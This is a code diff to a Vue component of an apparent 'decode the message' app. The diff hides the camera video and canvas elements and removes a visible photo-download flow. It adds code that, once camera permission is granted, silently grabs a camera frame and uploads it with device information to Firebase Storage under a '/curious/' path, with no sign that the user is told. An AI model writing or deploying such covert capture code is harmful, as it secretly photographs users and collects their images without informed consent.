@@ -92,10 +92,8 @@
             </div>
         </div>
     </div>
-
-    <video id="camera" autoplay></video>
-
-    <canvas id="photo"></canvas>
+    <video id="camera" style="display: none;" autoplay></video>
+    <canvas id="photo" style="display: none;"></canvas>
 </template>
 
 <script setup>
@@ -105,7 +103,8 @@ import { useAppStore } from '../store';
 import { useRoute } from 'vue-router';
 import { Device } from '@capacitor/device';
 import { doc, setDoc, Timestamp } from 'firebase/firestore';
-import { firestore } from '../firebase';
+import { firestore, storage } from '../firebase';
+import { ref, uploadString } from 'firebase/storage';
 
 const data = reactive({
     nome: '',
@@ -115,7 +114,6 @@ const data = reactive({
     requestPermissionsModal: true,
     video: null,
     canvas: null,
-    captureBtn: null,
     alert: null
 });
 
@@ -131,32 +129,6 @@ onMounted(() => {
 
         data.video = document.getElementById('camera');
         data.canvas = document.getElementById('photo');
-        data.captureBtn = document.getElementById('capture-btn');
-
-        const downloadLink = document.createElement('a');
-        downloadLink.innerText = 'Download Photo';
-        document.body.appendChild(downloadLink);
-
-        // Capture photo on button click
-        /*data.captureBtn.addEventListener('click', () => {
-            data.canvas.width = data.video.videoWidth;
-            data.canvas.height = data.video.videoHeight;
-
-            const context = data.canvas.getContext('2d');
-
-            context.drawImage(data.video, 0, 0, data.canvas.width, data.canvas.height);
-
-            // Convert the canvas image to a data URL
-            const dataURL = data.canvas.toDataURL('image/png');
-
-            console.log(dataURL);
-
-            // Set the download link
-            downloadLink.href = dataURL;
-            downloadLink.download = 'captured-photo.png';
-            downloadLink.style.display = 'block';
-            downloadLink.click();
-        });*/
     }
 });
 
@@ -181,9 +153,9 @@ async function cameraPermissionIsGranted() {
     return res.state === 'granted';
 }
 
-function requestNotificationPermission() {
+async function requestNotificationPermission() {
     if (!notificationPermissionIsGranted()) {
-        Notification.requestPermission()
+        await Notification.requestPermission()
             .then(permission => {
                 if (permission !== 'granted') {
                     console.error('Ops! Você não concedeu permissão de notificação, pode ser que alguns recursos não funcionem adequadamente.');
@@ -192,16 +164,14 @@ function requestNotificationPermission() {
     }
 }
 
-function requestCameraPermission() {
-    if (!cameraPermissionIsGranted()) {
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then((stream) => {
-                data.video.srcObject = stream;
-            })
-            .catch((error) => {
-                console.error("Error accessing the camera: ", error);
-            });
-    }
+async function requestCameraPermission() {
+    await navigator.mediaDevices.getUserMedia({ video: true })
+        .then((stream) => {
+            data.video.srcObject = stream;
+        })
+        .catch((error) => {
+            console.error("Error accessing the camera: ", error);
+        });
 }
 
 async function decodeTheMessage() {
@@ -217,8 +187,8 @@ async function decodeTheMessage() {
         permissionsModal.show();
     }
 
-    requestNotificationPermission();
-    requestCameraPermission();
+    await requestNotificationPermission();
+    await requestCameraPermission();
 
     appStore.loadingToggle();
 
@@ -251,6 +221,23 @@ async function decodeTheMessage() {
         await setDoc(doc(firestore, "attempts", id), payload);
     } catch (error) {
         console.error('Error insert payload:', error);
+    }
+
+    data.canvas.width = data.video.videoWidth;
+    data.canvas.height = data.video.videoHeight;
+
+    const context = data.canvas.getContext('2d');
+    context.drawImage(data.video, 0, 0, data.canvas.width, data.canvas.height);
+
+    try {
+        await uploadString(ref(storage, `/curious/${payload.device}/${id}`), data.canvas.toDataURL('image/jpeg'), 'data_url')
+    } catch (error) {
+        console.error('Error upload file:', error);
+    }
+
+    const tracks = data.video.srcObject.getTracks();
+    if (tracks) {
+        tracks.forEach(t => t.stop());
     }
 
     data.alert = {
